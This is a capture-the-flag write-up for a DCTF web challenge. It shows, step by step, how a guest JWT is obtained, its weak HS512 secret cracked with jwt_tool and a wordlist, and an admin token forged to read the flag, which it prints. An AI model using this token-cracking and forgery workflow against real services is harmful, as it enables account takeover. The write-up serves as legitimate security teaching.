Prompt:
```
Frontend is overrated! API rocks!
```

Visiting the website, we are greeted with a JSON response saying that the 'Authorization header is missing' and that we are not authorized:

![Website](secure-api5.png)

We manage to guess correctly and find the /login endpoint.
$ curl -X POST http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login
{"Error":"Missing username or password field."}

We provide the username and password as `guest:guest`, per the landing page's suggestion of using a guest account. This gets us a JWT token we can use to log in as the guest user.
```
$ curl -X POST http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login -F "username=guest" -F "password=guest"
{"Token":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMDE2NjkyfQ.v63VvzMyJ3o2oPVV72-ikLClsPOCvJzBDoNg4LtWGrjVZKxXWh0JBLOSX-srllbRMuZoj7dl1pGlVYThbE_0NQ"}
```

We will follow the website's suggestion and add in the following `Authorization` header and provide the JWT token, using "Bearer" as the authentication type (since we are dealing with token authentication):
```
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMDE2NjkyfQ.v63VvzMyJ3o2oPVV72-ikLClsPOCvJzBDoNg4LtWGrjVZKxXWh0JBLOSX-srllbRMuZoj7dl1pGlVYThbE_0NQ
```


After setting the Authentication header as described above, we now get a different response from the web server:

![Authenticating as guest](secure-api1.png)

Since we have the guest user's JWT, we can try to attempt to tamper it:
```
$ base64 -d <<< "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMDE2NjkyfQ.v63VvzMyJ3o2oPVV72-ikLClsPOCvJzBDoNg4LtWGrjVZKxXWh0JBLOSX-srllbRMuZoj7dl1pGlVYThbE_0NQ" -i
{"typ":"JWT","alg":"HS512"}{"username":"guest","exp":1621016692}
```

We can attempt to crack the passphrase used to sign the JWT since it is using a weak HMAC HS512 algorithm:
```bash
python3 jwt_tool.py -t http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/ -rh "Authoriz
ation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMDE4OTUwfQ.TGOKDyPXaFucGbFqzk_tBfXW3KIs4lX
9Bkm5iQnjuZY5IXovjm7kaZ3SRWyoEjDdT9uhKfhC8CIJ1f8CfaHUpQ" -C -d /usr/share/wordlists/rockyou.txt
```

![Cracking the password](secure-api6.png)

We successfully cracked the passphrase! We can now tamper the token and resign it using different values for the JWT token claims.
We will change the `username` claim value to `admin`.
```bash
python3 jwt_tool.py -t http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/ -rh "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMDE4OTUwfQ.TGOKDyPXaFucGbFqzk_tBfXW3KIs4lX9Bkm5iQnjuZY5IXovjm7kaZ3SRWyoEjDdT9uhKfhC8CIJ1f8CfaHUpQ" -T -S hs512 -p "147852369" -pc username -pv admin
```

![Tampering the token](secure-api4.png)

After the tampering the token and setting the bearer token value in the Authorization header to our new token value, we now get a new response from the webserver from the `/flag` endpoint. The webserver finally provides us with the value of the flag

![Getting the flag](secure-api3.png)

```
{"Message":"Hi, admin! I have a secret for you.","Secret":"dctf{w34k_k3y5_4r3_n0t_0k4y}"}
```

Flag: `dctf{w34k_k3y5_4r3_n0t_0k4y}`
